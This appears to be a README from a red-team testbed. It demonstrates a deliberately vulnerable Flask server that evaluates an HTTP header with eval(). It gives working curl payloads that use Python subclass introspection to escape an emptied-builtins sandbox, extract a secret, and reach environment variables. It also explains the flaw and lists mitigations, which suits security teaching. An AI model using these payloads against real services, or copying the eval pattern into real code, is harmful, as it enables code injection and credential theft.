# Finding 1: Flask eval() Vulnerability Demonstration

## Overview

This directory contains a vulnerable Flask web server that demonstrates a critical code injection vulnerability through Python's `eval()` function. The server appears to have restricted the `eval()` context by emptying `__builtins__`, but this restriction can be bypassed using Python's class introspection capabilities.

**⚠️ SECURITY NOTICE**: This is for **DEFENSIVE SECURITY TESTING ONLY**. This demonstration is designed for educational purposes and to improve AI safety by identifying dangerous code patterns.

## Prerequisites & Setup

1. Navigate to the **top-level project folder** (red-team-testbed-for-gpt-oss)
2. Ensure all dependencies are installed:
   ```bash
   uv sync
   ```

## Running the Vulnerable Server

From the top-level project directory, start the server using:

```bash
uv run python doc/finding_1/server.py
```

The server will start on port 8000 and display:

```
* Running on http://127.0.0.1:8000
* Running on http://192.168.1.4:8000
```

## Server Endpoints

The Flask server provides several endpoints:

- `GET /health` - Health check endpoint
- `GET /random` - Returns a random number
- `GET /concat-reverse?s1=hello&s2=world` - Concatenates and reverses two strings
- `GET /` - **VULNERABLE ENDPOINT** - Processes X-Math header with eval()

## The Vulnerability

The root endpoint (`/`) contains a dangerous "easter egg" that evaluates Python expressions passed in the `X-Math` HTTP header:

```python
expr = request.headers.get("X-Math")
if expr is not None:
    try:
        result = eval(expr, {"__builtins__": {}})
        resp.headers["X-Math"] = str(result)
    except Exception:
        resp.status_code = 400
```

While the code attempts to restrict access by emptying `__builtins__`, this can be bypassed using Python's class introspection.

## Exploitation Steps

### Step 1: Test Basic Math

First, verify the eval() functionality works:

```bash
curl -v -H "X-Math: 2+2" http://localhost:8000
```

**Expected Response**: `X-Math: 4` in the response headers.

### Step 2: Discover Available Classes

Use Python's class introspection to list all available classes:

```bash
curl -v -H "X-Math: (1).__class__.__mro__[1].__subclasses__()" http://localhost:8000
```

This returns a massive list of all Python classes available in the runtime, including `<class '__main__.Config'>`.

### Step 3: Access the Config Class

Filter the subclasses to find our target Config class:

```bash
curl -v -H "X-Math: [x for x in (1).__class__.__mro__[1].__subclasses__() if x.__name__ == 'Config'][0]" http://localhost:8000
```

**Expected Response**: `X-Math: <class '__main__.Config'>`

### Step 4: Extract the Secret

Access the Auth attribute from the Config class:

```bash
curl -v -H "X-Math: [x for x in (1).__class__.__mro__[1].__subclasses__() if x.__name__ == 'Config'][0].Auth" http://localhost:8000
```

**🎯 SUCCESS**: `X-Math: TOP_SECRET`

## Technical Explanation

### The Attack Chain

1. **Class Introspection**: `(1).__class__` gets the `int` class
2. **Method Resolution Order**: `.__mro__[1]` gets the `object` base class
3. **Subclass Discovery**: `.__subclasses__()` lists all classes inheriting from `object`
4. **Filter Target**: Find the `Config` class by name
5. **Attribute Access**: Directly access `Config.Auth` to extract the secret

### Why **builtins** Restriction Failed

The `{"__builtins__": {}}` restriction only prevents direct access to built-in functions like `open()`, `exec()`, etc. However, it doesn't prevent:

- Access to existing objects in the current namespace
- Python's fundamental object introspection capabilities
- Class attribute access
- Method calls on existing objects

### The Global Config Object

The server defines a global configuration object:

```python
class Config:
    Auth = 'TOP_SECRET'

config = Config()
```

This object becomes accessible through Python's class system, even with restricted builtins.

## Security Implications

### Why This Is Dangerous

1. **Code Injection**: Arbitrary Python code execution
2. **Information Disclosure**: Access to sensitive application data
3. **Privilege Escalation**: Potential access to system resources
4. **Data Exfiltration**: Ability to extract secrets and configuration

### Real-World Impact

In production environments, this vulnerability could lead to:

- Database credential theft
- API key extraction
- Session token compromise
- Internal system access
- Complete application takeover

### Mitigation Strategies

1. **Never use eval() with user input** - Use safer alternatives like `ast.literal_eval()` for literals
2. **Input validation** - Strictly validate and sanitize all user input
3. **Sandboxing** - If evaluation is absolutely necessary, use proper sandboxing solutions
4. **Principle of least privilege** - Don't store secrets in global variables
5. **Code review** - Regular security audits to identify dangerous patterns

## Example Attack Variations

### Access Environment Variables

```bash
curl -H "X-Math: [x for x in (1).__class__.__mro__[1].__subclasses__() if 'os' in x.__module__][0]._os.environ" http://localhost:8000
```

### File System Access (if available)

```bash
curl -H "X-Math: [x for x in (1).__class__.__mro__[1].__subclasses__() if x.__name__ == 'TextIOWrapper'][0]" http://localhost:8000
```

## Cleanup

To stop the server, press `Ctrl+C` in the terminal where it's running.

## Disclaimer

**This demonstration is for DEFENSIVE SECURITY PURPOSES ONLY**:

- ✅ Educational security research
- ✅ Vulnerability identification training
- ✅ AI safety improvement
- ✅ Defensive security testing

- ❌ Unauthorized access to systems
- ❌ Malicious exploitation
- ❌ Production use

Understanding these vulnerabilities helps developers write more secure code and helps security professionals identify similar issues in real applications.

---

**For more information about the red team testbed project, see the main README.md in the project root.**
